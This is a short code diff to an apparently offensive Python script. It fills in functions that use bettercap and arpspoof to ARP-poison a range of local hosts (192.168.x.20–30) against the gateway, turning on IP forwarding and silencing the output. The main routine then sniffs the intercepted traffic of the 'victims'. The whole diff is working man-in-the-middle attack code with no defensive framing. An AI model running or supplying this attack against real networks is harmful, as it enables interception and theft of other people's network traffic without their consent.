@@ -27,21 +27,33 @@ def ettercap():
 	pass
 
 def bettercap():
-	# TODO
-	pass
-
+	cmd = """
+	bettercap -caplet /dev/stdin <<< '
+	net.probe on
+	set arp.spoof.targets 192.168.1.20-30
+	arp.spoof on
+	'
+	"""
+	os.system(cmd)
+	
 def mitmf():
 	# TODO
 	pass
 
 def dsniff():
-	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-	for i in range(20, 30):
-		os.system("arpspoof -t 192.168.0.1 192.168.0.{} > /dev/null 2> /dev/null &".format(i))
-		os.system("arpspoof -t 192.168.0.{} 192.168.0.1 > /dev/null 2> /dev/null &".format(i))
+	cmd = """
+	echo 1 > /proc/sys/net/ipv4/ip_forward ;
+	for x in $(seq 20 30) ;
+	do
+		arpspoof -t 192.168.0.1 192.168.0.$x > /dev/null 2> /dev/null & ;
+		arpspoof -t 192.168.0.$x 192.168.0.1 > /dev/null 2> /dev/null & ;
+	done
+	"""
+	os.system(cmd)
 
 def main():
-	dsniff()
+	#dsniff()
+	bettercap()
 	try:
 		sniff(filter="ip", prn=wait_all_victims)
 	except PermissionError:
